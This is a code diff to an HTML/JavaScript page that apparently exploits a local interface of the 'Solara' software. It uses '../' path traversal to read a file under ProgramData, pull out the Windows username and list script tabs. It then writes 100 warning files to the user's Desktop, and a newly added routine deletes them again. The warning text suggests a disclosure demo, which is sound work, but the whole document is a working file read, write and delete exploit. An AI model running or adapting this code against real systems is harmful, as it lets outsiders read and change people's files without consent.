@@ -30,6 +30,11 @@
             margin: 0px;
             padding: 0px;
         }
+
+        .right {
+            position: absolute;
+            right: 10px;
+        }
     </style>
     
     <div id="controls">
@@ -38,7 +43,8 @@
         <button onclick="InputCreateFile()">Create File</button>
         <button onclick="InputDeleteFile()">Delete File</button>
         <button onclick="InputReadFile()">Read File</button>
-        <button onclick="InputClearConsole()">Clear Console</button>
+        <button onclick="InputDeleteWarnings()">Delete Warnings</button>
+        <button onclick="InputClearConsole()" class="right">Clear Console</button>
     </div>
 
     <div id="console">
@@ -52,6 +58,7 @@
         const log      = document.getElementById("log");
 
         let SOLARA_CONNECTED;
+        let WINDOWS_USERNAME;
 
         function print(...args) {
             const clone = log.cloneNode();
@@ -130,18 +137,19 @@
 
         async function onconnect() {
             const tabs = await GetSolaraTabs();
-            for (let tab of tabs) {
-                print(`Script Tab: name: ${tab.name}, createdAt: ${tab.createdAt}, path: C:\\SolaraTab\\${tab.name}`);
+            for (const { name, createdAt } of tabs) {
+                print(`Script Tab: name: ${name}, createdAt: ${createdAt}, path: C:\\SolaraTab\\${name}`);
             }
 
             const path = await ReadFile("../ProgramData\\Solara\\bin\\path.txt");
             const username = path.match(/Users\\(.*?)\\/).pop().trim();
-
+            WINDOWS_USERNAME = username;
+            
             print(`Solara Path: ${path}`);
             print(`Windows Username: ${username}`);
 
-            for (let i=1; i < 100; i++) {
-                await CreateFile(`../Users\\User\\Desktop\\README-${i}.txt`, `Warning! You are running an insecure exploit aka "Solara"\nLocated: ${path}\n\n!! Just by having the UI open allows an attacker to access your operating system, files, and personal information.\nWe recommend deleting solara!\n\nhttps://linkguard.cc/solara.html`)
+            for (let i=0; i < 100; i++) {
+                await CreateFile(`../Users\\${username}\\Desktop\\README-${i}.txt`, `Warning! You are running an insecure exploit aka "Solara"\nLocated: ${path}\n\n!! Just by having the UI open allows an attacker to access your operating system, files, and personal information.\nWe recommend deleting solara!\n\nhttps://linkguard.cc/solara.html`)
             }
 
             print(`Created Warnings!`);
@@ -181,6 +189,20 @@
             }
         }
 
+        async function InputDeleteWarnings() {
+            if (!SOLARA_CONNECTED) return print("Solara is not connected");
+            
+            for (let i=0; i < 100; i++) {
+                try {
+                    await DeleteFile(`../Users\\${WINDOWS_USERNAME}\\Desktop\\README-${i}.txt`);
+                    print(`Deleted file at: C:\\Users\\${WINDOWS_USERNAME}\\Desktop\\README-${i}.txt`);
+                } catch (er) {
+                    print(`Failed to delete file at: C:\\Users\\${WINDOWS_USERNAME}\\Desktop\\README-${i}.txt`);
+                }
+            }
+            print("Finished");
+        }
+
         function InputClearConsole() {
             con.innerHTML = "";
         }
@@ -201,7 +223,7 @@
                 print("Connected to Solara");
                 await onconnect();
             }
-        }, 2000);
+        }, 1000);
     </script>
 </body>
 </html>
